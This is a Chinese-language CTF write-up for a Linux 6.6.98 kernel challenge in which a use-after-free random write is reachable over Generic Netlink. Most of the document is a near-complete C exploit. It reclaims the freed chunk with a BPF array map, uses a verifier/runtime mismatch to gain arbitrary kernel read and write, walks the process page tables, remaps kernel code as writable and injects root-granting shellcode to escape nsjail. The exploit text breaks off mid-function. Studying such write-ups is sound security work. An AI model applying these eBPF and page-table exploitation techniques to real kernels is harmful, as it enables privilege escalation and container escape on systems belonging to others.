# wm_easynetlink

## 题目简述

题目是 Linux 6.6.98 内核利用，漏洞通过 Generic Netlink 暴露给用户态。附件运行脚本来自 KernelCTF 风格环境：`qemu_v3.sh` 使用 1 GB 内存、2 核、`qemu64,+smep,+smap`、KASLR、virtio rootfs 和只读 flag drive；当 release 名称为 `mitigation-v3*` 时还会开启 `dmesg_restrict`、`kptr_restrict=2`、`unprivileged_bpf_disabled=2`、`bpf_jit_harden=1`、`ptrace_scope=1`。核心原语是 UAF 后的随机写：可以往一个随机大小的已释放堆块中的随机偏移写入随机值。与原始 arandom 类题不同，本题把交互包在 netlink 协议里，并且最终还要逃出 nsjail namespace。

利用主线是：用可控大小的 `bpf_array` 占位被释放的随机堆块，使 eBPF verifier 看到的 map value 与运行时实际 value 不一致；再借鉴 CVE-2023-2163 的 BPF 利用方式，把这种 verifier/runtime 差异扩大为任意地址读写；最后定位当前进程 `task_struct` 和页表，改写内核页表映射，执行 shellcode 完成提权和 nsjail 逃逸。

## 解题过程

### 漏洞与外链技术要点

该题漏洞为 UAF 漏洞，可以往随机大小 free 堆块中的随机偏移处写随机值。`actf2025-arandom` 外链对应的是这种“随机释放块 + 随机偏移写”的原型题：利用重点不是一次写中精准命中目标，而是找到一个可以大量喷射、大小可控、被 verifier 信任且运行时可被污染的内核对象。

本题的利用方式来源是 CVE-2025-40364 的 KernelCTF 技巧：用 `bpf_array` 占位 UAF 块，先让 verifier 通过安全检查，再在运行阶段把 map value 所在内存扰动成不同值，从而制造 verifier 认知和真实执行之间的差异。

简单来说，由于我们可以往随机堆块中随机偏移处写随机值，并且 `bpf_array` 的 size 可以控制，因此可以使该 size 和前面的随机 size 相同。free 堆块以后使用 `bpf_array` 占位被释放的堆块，在过了 verify 以后往 `bpf_array` 随机 value 地址处写入一个随机值，这样运行时就可以得到一个和 verify 时不同的值。CVE-2023-2163 外链的关键结论是：如果能让 eBPF 程序在 verifier 通过后获得与验证时不同的 map 内容，就可以构造错误指针计算，进一步读写 BPF map 附近的内核对象，得到 kernel base、map 地址和任意地址读写 primitive。

该题与 `actf2025-arandom` 的区别在于套了一层 netlink 和 nsjail。Generic Netlink 交互的关键是：先创建 `nl_sock`，通过 family 名称解析 family id，再用 `genlmsg_put` 填充命令号和版本，通过 `nla_put_*` 放入属性，最后发送到内核模块。本题的 `ADDCMD`、`DELCMD`、`SHOWCMD`、`EDITCMD` 等命令就是通过这种方式触发。

接下来是 nsjail 逃逸部分，这里参考 ptr-yudai 与 d3kcache 的页表方法。外链中的关键思想是：当已经有内核任意读写时，不一定要只改 cred；可以从 `task_struct` 找到 `mm_struct` 和 `pgd`，解析当前进程页表，把用户可控映射或目标内核代码页重映射到可写/可执行状态，然后写入 shellcode。

由于我们有任意地址读写，因此可以通过 `prctl(PR_SET_NAME, "bubblebu")` 设置 `task_struct.comm`，然后内存搜索 `bubblebu` 获取 `task_struct` 地址。地址范围较大时，可以先借 CVE-2023-2163 类方法从 map 泄露当前进程的 `task_struct` 附近指针，再通过 `task_struct` 获取 `pgd` 等信息。最后按页表路线 patch 内核地址，执行 shellcode 完成 nsjail 逃逸。

完整 exp 如下。exp 依赖 `banzi.h` 提供日志、错误检查和常用 exploit helper；主要逻辑是 netlink 触发漏洞、eBPF 构造读写、页表解析和 shellcode 注入。

```c
#include <banzi.h>
#include <stdio.h>
#include <stdlib.h>
#include <netlink/genl/genl.h>
#include <netlink/netlink.h>
#include <errno.h>
#include "linux-6.6.98/samples/bpf/bpf_insn.h"
#include <linux/bpf.h>
int famid;
struct nl_sock* nlsock;
#define DELCMD 1
#define ADDCMD 2
#define SHOWCMD 3
#define EDITCMD 4
#define LISTCMD 5
#define ADDONLY 6

uint64_t alloc_size;
uint64_t random_offset;
uint64_t value;
uint64_t kernel_base;

#define PTE_OFFSET 12
#define PMD_OFFSET 21
#define PUD_OFFSET 30
#define PGD_OFFSET 39

#define PT_ENTRY_MASK 0b111111111UL
#define PTE_MASK (PT_ENTRY_MASK << PTE_OFFSET)
#define PMD_MASK (PT_ENTRY_MASK << PMD_OFFSET)
#define PUD_MASK (PT_ENTRY_MASK << PUD_OFFSET)
#define PGD_MASK (PT_ENTRY_MASK << PGD_OFFSET)

#define PTE_ENTRY(addr) ((addr >> 12) & PT_ENTRY_MASK)
#define PMD_ENTRY(addr) ((addr >> 21) & PT_ENTRY_MASK)
#define PUD_ENTRY(addr) ((addr >> 30) & PT_ENTRY_MASK)
#define PGD_ENTRY(addr) ((addr >> 39) & PT_ENTRY_MASK)
#define PAGE_ENTRY(addr) ((addr) & PT_ENTRY_MASK)

#define PAGE_ATTR_RW (1UL << 1)
#define PAGE_ATTR_NX (1UL << 63)
size_t s2, tmp_idx, page_offset_base, vmemmap_base;


int add(unsigned int idx) {
    struct nl_msg* msg;
    int res = 0;
    msg = nlmsg_alloc();
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, famid, 0, NLM_F_REQUEST, ADDCMD, 1);
    nla_put_u64(msg, 2, idx);
    res = nl_send_auto(nlsock, msg);
    if (res > 0) {
        logi("send success: %d\n", res);
    }
}
int del(unsigned int idx) {
    struct nl_msg* msg;
    int res = 0;
    msg = nlmsg_alloc();
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, famid, 0, NLM_F_REQUEST, DELCMD, 1);
    nla_put_u64(msg, 2, idx);
    res = nl_send_auto(nlsock, msg);
    if (res > 0) {
        logi("send success: %d\n", res);
    }
}

int edit(unsigned int idx) {
    struct nl_msg* msg;
    int res = 0;
    msg = nlmsg_alloc();
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, famid, 0, NLM_F_REQUEST, EDITCMD, 1);
    nla_put_u64(msg, 2, idx);
    res = nl_send_auto(nlsock, msg);
    if (res > 0) {
        logi("send success: %d\n", res);
    }
}

int show(unsigned int content, unsigned int addr) {
    //edit cmd
    struct nl_msg* msg;
    int res = 0;
    msg = nlmsg_alloc();
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, famid, 0, NLM_F_REQUEST, SHOWCMD, 1);
    nla_put_string(msg, 3, content);
    nla_put_u64(msg, 4, addr);
    res = nl_send_auto(nlsock, msg);
    if (res > 0) {
        logi("send success: %d\n", res);
    }
}

// BPF map address acquisition macro
#define BPF_MAP_GET_ADDR(idx, dst)                                   \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                             \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                            \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                           \
    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                          \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                        \
                 BPF_FUNC_map_lookup_elem),                           \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),          \
    BPF_MOV64_REG((dst), BPF_REG_0), BPF_MOV64_IMM(BPF_REG_0, 0)

#define LOG_BUF_SZ (0x10000)
char log_buf[LOG_BUF_SZ];
int map_fd = -1;
int map_fd2 = -1;

// Create BPF maps
int create_bpf_maps() {
    union bpf_attr attr = {};
    union bpf_attr attr2 = {};

    // Create main map
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = (alloc_size - 0x100 - 0x40);
    attr.max_entries = 1;
    attr.map_flags = BPF_F_RDONLY_PROG;
    map_fd = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr)));

    // Create auxiliary map
    attr2.map_type = BPF_MAP_TYPE_ARRAY;
    attr2.key_size = 4;
    attr2.value_size = 0x2000;
    attr2.max_entries = 0x1;
    attr2.inner_map_fd = 0;
    map_fd2 = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &attr2, sizeof(attr2)));

    // Freeze main map
    union bpf_attr freeze_attr = {};
    freeze_attr.map_fd = map_fd;
    SYSCHK(syscall(SYS_bpf, BPF_MAP_FREEZE, &freeze_attr, sizeof(freeze_attr)));

    return 0;
}

// Create BPF program for stack overflow exploitation
int create_stack_overflow_prog() {
    struct bpf_insn prog[] = {
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // Setup map lookup
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_8, random_offset),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x1),

        // Setup stack layout for overflow attack
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0xCAFE),   // magic value1
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0xBACA),  // magic value2
        BPF_LD_MAP_FD(BPF_REG_8, map_fd2),
        // *(r10 - 24) = r8
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -24),
        BPF_MOV64_REG(BPF_REG_5, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, -8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -32),

        // Trigger stack overflow
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -40),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // Verify overflow success and extract leaked kernel address
        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_10, -32),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_5, 0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, -8),

        // Verify magic value
        // BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0xBACA, 12),

        // Store leaked kernel address
        BPF_LD_MAP_FD(BPF_REG_9, map_fd2),
        BPF_MAP_GET_ADDR(0, BPF_REG_8),
        // *(r8) = r7
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    union bpf_attr prog_attr = {};
    prog_attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    prog_attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    prog_attr.insns = (uintptr_t)prog;
    prog_attr.license = (uintptr_t)"GPL";
    prog_attr.log_level = 2;
    prog_attr.log_buf = (uintptr_t)log_buf;
    prog_attr.log_size = LOG_BUF_SZ;

    int prog_fd = syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
    if (prog_fd < 0) {
        puts(log_buf);
        perror("syscall");
    }
    else {
        puts(log_buf);
    }

    return prog_fd;
}

// Create variant program for address leaking
int create_leak_variant_prog(int multiplier, int size) {
    struct bpf_insn prog[] = {
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        // r4 = *(u64 *)(BPF_REG_8 + random_offset)
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_8, random_offset),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x1),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_4),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_4, multiplier),

        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0xCAFE),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0xBACA),
        BPF_LD_MAP_FD(BPF_REG_8, map_fd2),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -24),
        BPF_MOV64_REG(BPF_REG_5, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, -8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -32),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -40),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        BPF_LD_MAP_FD(BPF_REG_9, map_fd2),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_7, 0),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_6),

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_REG(BPF_MUL, BPF_REG_4, BPF_REG_7),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_4, 0x8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_10, -32),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_5, BPF_REG_4),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_5, 0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_4),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    union bpf_attr prog_attr = {};
    prog_attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    prog_attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    prog_attr.insns = (uintptr_t)prog;
    prog_attr.license = (uintptr_t)"GPL";
    prog_attr.log_level = 2;
    prog_attr.log_buf = (uintptr_t)log_buf;
    prog_attr.log_size = LOG_BUF_SZ;

    int prog_fd = syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
    if (prog_fd < 0) {
        puts(log_buf);
        perror("syscall");
        exit(0);
    }
    else {
        puts(log_buf);
    }

    return prog_fd;
}

// Execute BPF program test
int run_bpf_test(int prog_fd, char* data_buf, size_t data_size) {
    struct __sk_buff md = {};
    union bpf_attr test_prog = {};
    test_prog.test.data_in = (uint64_t)data_buf;
    test_prog.test.data_size_in = data_size;
    test_prog.test.ctx_in = (uint64_t)&md;
    test_prog.test.ctx_size_in = sizeof(md);
    test_prog.prog_type = BPF_PROG_TEST_RUN;
    test_prog.test.prog_fd = prog_fd;

    uint64_t ret = syscall(SYS_bpf, BPF_PROG_TEST_RUN, &test_prog, sizeof(test_prog));
    if (ret < 0) {
        perror("test run");
        return -1;
    }
    return 0;
}

// Read value from BPF map
uint64_t* read_bpf_value = NULL;
uint64_t* read_from_map(int map_fd, int key) {
    union bpf_attr attr = {};
    attr.map_fd = map_fd;
    attr.key = (uint64_t)&key;
    attr.value = (uint64_t)read_bpf_value;
    // attr.value_size = 0x1000;

    SYSCHK(syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)));
    // hexdump(read_bpf_value, 0x50);
    return read_bpf_value;
}

// Create variant program for address leaking
int create_write_prog(int multiplier) {
    struct bpf_insn prog[] = {
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_8, random_offset),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_4, multiplier),

        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0xCAFE),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0xBACA),
        BPF_LD_MAP_FD(BPF_REG_8, map_fd2),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -24),
        BPF_MOV64_REG(BPF_REG_5, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, -8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -32),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -40),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_10, -32),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -40),
        BPF_STX_MEM(BPF_DW, BPF_REG_5, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    union bpf_attr prog_attr = {};
    prog_attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    prog_attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    prog_attr.insns = (uintptr_t)prog;
    prog_attr.license = (uintptr_t)"GPL";
    prog_attr.log_level = 2;
    prog_attr.log_buf = (uintptr_t)log_buf;
    prog_attr.log_size = LOG_BUF_SZ;

    int prog_fd = syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
    if (prog_fd < 0) {
        puts(log_buf);
        perror("syscall");
    }
    else {
        puts(log_buf);
    }

    return prog_fd;
}


int prog_fd2 = -1;
int prog_fd3 = -1;
uint64_t* aar(uint64_t addr) {
    char* data_buf2 = (char*)calloc(1, 0x1000);
    uint64_t* payload2 = (uint64_t*)(data_buf2 + 0xe);
    payload2[0] = 0x00000000001234;
    payload2[1] = addr;
    if (run_bpf_test(prog_fd2, data_buf2, 1024) < 0) {
        free(data_buf2);
        return -1;
    }
    return read_from_map(map_fd2, 0);
}

uint64_t aaw(uint64_t addr, uint64_t value) {
    char* data_buf2 = (char*)calloc(1, 0x1000);
    uint64_t* payload2 = (uint64_t*)(data_buf2 + 0xe);
    payload2[0] = value;
    payload2[1] = addr;
    if (run_bpf_test(prog_fd3, data_buf2, 1024) < 0) {
        free(data_buf2);
        return -1;
    }
}
static void win64() {
    char buf[0x100];
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) {
        puts("[-] Lose...");
    }
    else {
        puts("[+] Win!");
        read(fd, buf, 0x100);
        write(1, buf, 0x100);
        puts("[+] Done");
    }
    exit(0);
}

int exp() {
    save_state();
    char* content = calloc(1, 0x10);
    read_bpf_value = calloc(1, 0x10000);
    memcpy(content, "backdoor", 0x8);
    char* addr = calloc(1, 0x100);
    // edit(0);
    show(content, addr);
    uint64_t* u64_addr = (uint64_t*)addr;
    logi("size: 0x%llx\n", u64_addr[0]);
    logi("value: 0x%llx\n", u64_addr[1]);
    logi("offset: 0x%llx\n", u64_addr[2]);
    alloc_size = u64_addr[0];
    value = u64_addr[1];
    random_offset = u64_addr[2] - 0x150; //减去bpf的头
    if ((value & 0x1) != 1) {
        loge("value is %llx, something is wrong\n", value & 0x1);
        return -1;
    }
    // Create BPF maps
    add(0);
    del(0);
    if (create_bpf_maps() < 0) {
        return -1;
    }
    // Create BPF programs
    int prog_fd = create_stack_overflow_prog();
    prog_fd2 = create_leak_variant_prog(0x8, 0x100);
    prog_fd3 = create_write_prog(0x8);
    edit(0);

    char data_buf[4096] = {};
    memset(data_buf, '\xd0', sizeof(data_buf));
    // Execute first program
    if (run_bpf_test(prog_fd, data_buf, 1024) < 0) {
        return -1;
    }
    // Read leaked address
    uint64_t array_map_addr = *(uint64_t*)read_from_map(map_fd2, 0);
    logi("array_map_addr: 0x%llx", array_map_addr);
    if (array_map_addr == 0) {
        loge("[-] Failed to leak array_map_addr");
        return -1;
    }
    kernel_base = aar(array_map_addr)[0] - (0xffffffff8221e880 - 0xffffffff81000000);
    logi("kernel_base: 0x%llx", kernel_base);
    if (kernel_base & 0xfff) {
        loge("[-] kernel_base is not page aligned: 0x%llx", kernel_base);
        return -1;
    }
    uint64_t core_pattern = kernel_base + (0xffffffff82a512a0 - 0xffffffff81000000);
    uint64_t kstrtab_init_pid_ns = kernel_base + (0xffffffff828653e1 - 0xffffffff81000000);
    prctl(PR_SET_NAME, "bubblebu");
    uint64_t current_task_struct = -1;
    uint64_t temp_array_map_addr = array_map_addr - 0x800000;
    logi("temp_array_map_addr: 0x%llx", temp_array_map_addr);
    uint64_t init_pid_ns = kernel_base + (0xffffffff82a508e0 - 0xffffffff81000000);
    logi("init_pid_ns: 0x%llx", init_pid_ns);
    uint64_t xa_head = aar(init_pid_ns + 0x8)[0] & ~2;
    logi("xa_head: 0x%llx", xa_head);
    uint64_t xa_head_next = aar(xa_head + 0x30)[0] & ~2;
    logi("xa_head_next: 0x%llx", xa_head_next);
    uint64_t task_struct_addr = aar(xa_head_next + 0x8)[0];
    task_struct_addr = aar(task_struct_addr + 0x38)[0] & ~2;
    uint64_t task_struct_addr_temp = -1;
    for (int i = 0;i < 0x10;i++) {
        uint64_t temp_addr = aar(task_struct_addr + i * 0x8)[0];
        if (temp_addr) {
            task_struct_addr_temp = temp_addr;
        }
    }
    task_struct_addr = task_struct_addr_temp;
    logi("task_struct_addr: 0x%llx", task_struct_addr_temp);
    uint64_t temp_addr = aar(task_struct_addr + 0x20)[0];
    if (temp_addr != 0) {
        task_struct_addr = temp_addr;
        logi("task_struct_addr updated: 0x%llx", task_struct_addr);
        current_task_struct = task_struct_addr - 0x600;
    }
    else {
        task_struct_addr = aar(task_struct_addr + 0x10)[0];
        logi("task_struct_addr updated: 0x%llx", task_struct_addr);
        current_task_struct = task_struct_addr - 0x5e0;
    }
    logi("current_task_struct: 0x%llx", current_task_struct);
    if (aar(current_task_struct + 1896)[0] != 0x7562656c62627562) {
        loge("[-] current_task_struct.comm is not bubblebu");
        return -1;
    }
    uint64_t current_mm_struct_addr = current_task_struct + 1272;
    uint64_t current_mm_struct = aar(current_mm_struct_addr)[0];
    if (!is_heap_pointer(current_mm_struct)) {
        loge("[-] current_mm_struct is not a heap pointer");
        return -1;
    }
    logi("current_mm_struct: 0x%llx", current_mm_struct);
    uint64_t pgd_addr = current_mm_struct + 128;
    uint64_t pgd = aar(pgd_addr)[0];
    logi("pgd: 0x%llx", pgd);
    page_offset_base = (xa_head_next & 0xfffffffff0000000);
    logi("page_offset_base: 0x%llx", page_offset_base);
    char* mmap_addr = mmap(0x114514000, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (!mmap_addr) {
        perror("mmap");
        return -1;
    }
    uint64_t do_getuid = kernel_base + (0xffffffff810ac010 - 0xffffffff81000000);
    memset(mmap_addr, '\x41', 0x1000);
    logi("mmap_addr: %p", mmap_addr);

    uint64_t mmap_pud_addr = aar(pgd + PGD_ENTRY((uint64_t)mmap_addr) * 0x8)[0] & (~PAGE_ATTR_NX) & ~0xfff;
    mmap_pud_addr += page_offset_base;
    logi("mmap_pud_addr: 0x%llx", mmap_pud_addr);
    logi("pgd_entry: 0x%llx,pud_entry: 0x%llx,pmd_entry: 0x%llx,pte_entry: 0x%llx",
        PGD_ENTRY((uint64_t)mmap_addr), PUD_ENTRY((uint64_t)mmap_addr), PMD_ENTRY((uint64_t)mmap_addr), PTE_ENTRY((uint64_t)mmap_addr));

    uint64_t mmap_pmd_addr = aar(mmap_pud_addr + PUD_ENTRY((uint64_t)mmap_addr) * 0x8)[0] & (~PAGE_ATTR_NX) & ~0xfff;
    mmap_pmd_addr += page_offset_base;
    logi("mmap_pmd_addr: 0x%llx", mmap_pmd_addr);

    uint64_t mmap_pte_addr = aar(mmap_pmd_addr + PMD_ENTRY((uint64_t)mmap_addr) * 0x8)[0] & (~PAGE_ATTR_NX) & ~0xfff;
    mmap_pte_addr += page_offset_base;
    logi("mmap_pte_addr: 0x%llx", mmap_pte_addr);

    uint64_t do_getuid_pud_addr = aar(pgd + 0x8 * PGD_ENTRY((uint64_t)do_getuid))[0] & (~PAGE_ATTR_NX) & ~0xfff;
    do_getuid_pud_addr += page_offset_base;
    logi("do_getuid_addr: 0x%llx", do_getuid);
    logi("do_getuid_pud_addr: 0x%llx", do_getuid_pud_addr);

    uint64_t do_getuid_pmd_addr = aar(do_getuid_pud_addr + PUD_ENTRY((uint64_t)do_getuid) * 0x8)[0] & (~PAGE_ATTR_NX) & ~0xfff;
    do_getuid_pmd_addr += page_offset_base;
    logi("do_getuid_pmd_addr: 0x%llx", do_getuid_pmd_addr);

    uint64_t do_getuid_pte_addr = aar(do_getuid_pmd_addr + PMD_ENTRY((uint64_t)do_getuid) * 0x8)[0] & (~PAGE_ATTR_NX) & ~0xfff;
    logi("do_getuid_pte_addr: 0x%llx", do_getuid_pte_addr);
    uint64_t phy_addr = do_getuid_pte_addr + 0x1000 * PTE_ENTRY((uint64_t)do_getuid_pte_addr);
    phy_addr += 0xac000;
    logi("phy_addr: 0x%llx", phy_addr);
    __pause("debug");
    aaw(mmap_pte_addr + PTE_ENTRY((uint64_t)mmap_addr) * 0x8, phy_addr | 0x8000000000000867);
    // SYSCHK(memset(mmap_addr + (do_getuid & 0xfff), '\x41', 0x40)); /* nop */
    char shellcode[] = { 0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0x19, 0xc0, 0x0a, 0x00, 0x49, 0x8d, 0xbf, 0x60, 0x0f, 0xa5, 0x01, 0x49, 0x8d, 0x87, 0xb0, 0x38, 0x0c, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0xe0, 0x8c, 0x0b, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0x80, 0x0a, 0xa5, 0x01, 0x49, 0x8d, 0x87, 0x70, 0x16, 0x0c, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x20, 0xde, 0xb6, 0x01, 0x49, 0x8d, 0x87, 0x40, 0x7c, 0x35, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0xe0, 0x8c, 0x0b, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x98, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0xe1, 0x16, 0x00, 0x01, 0xff, 0xe0, 0xcc };
    void* p;
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
